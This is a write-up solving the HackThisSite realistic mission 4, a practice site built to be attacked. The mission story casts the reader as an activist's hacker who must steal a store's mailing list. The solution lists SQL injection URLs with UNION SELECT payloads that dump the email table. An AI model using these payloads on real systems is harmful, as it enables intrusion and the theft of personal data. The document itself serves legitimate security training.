@@ -1,0 +1,42 @@
+https://www.hackthissite.org/playlevel/4/
+https://www.hackthissite.org/missions/realistic/4/
+
+Description:
+  Fischer's Animal Products
+  FAP is a company that slaughters animals and turns their skin into overpriced products which are then sold to rich bastards! Help animal rights 
+  activists increase political awareness by hacking their mailing list.
+  Difficulty rating: Moderate.
+  
+  From: SaveTheWhales
+
+  Message: Hello, I was referred to you by a friend who says you know how to hack into computers and web sites - well I was wondering 
+    if you could help me out here. There's this local store who is killing hundreds of animals a day exclusively for the purpose of selling 
+    jackets and purses etc out of their skin! I have been to their website and they have an email list for their customers. I was wondering 
+    if you could somehow hack in and send me every email address on that list? I want to send them a message letting them know of the murder 
+    they are wearing. Just reply to this message with a list of the email addresses. Please? Their website is at 
+    http://www.hackthissite.org/missions/realistic/4/. Thanks so much!!
+
+
+
+Solution:
+  We are initially provided with what looks like an online store site.  There is a link to add yourself to the mailing list, to see fur coats, and to see 
+  aligator accessories.  Clicking on the links provides the following URLs.
+
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=2
+
+  Looking at these URLs my first thought is to use SQL injection on the URL.  I tried the following URL first to verify this:
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 LIMIT 1
+
+  This returned a single result, so we know that SQL injection should work.  Now we have to find the correct tables for the data.  I tried the following URLs.
+
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION SELECT * FROM email
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 OR category!=1
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT *,NULL FROM email
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT NULL, *, NULL FROM email
+
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT NULL, *, NULL, NULL FROM email
+  This one returns the products and the list of emails.  So now we need to email the list to SaveTheWhales.  We can do that from the main HTS site.
+
+  Return to the main page, click the HTS Messaging Center link.  Then click the Compose link.  Then send the message to savethewhlaes.
+
